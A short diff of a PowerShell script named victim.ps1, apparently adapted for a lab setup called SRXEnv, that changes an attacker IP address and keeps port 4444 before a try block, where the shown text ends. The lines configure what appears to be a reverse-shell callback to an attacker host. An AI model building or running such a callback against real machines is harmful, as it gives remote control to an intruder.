@@ -1,5 +1,5 @@
 # victim.ps1 - Angepasst für SRXEnv
-$attackerIp = "10.212.134.201" 
+$attackerIp = "192.168.153.155" 
 $attackerPort = 4444
 
 try {
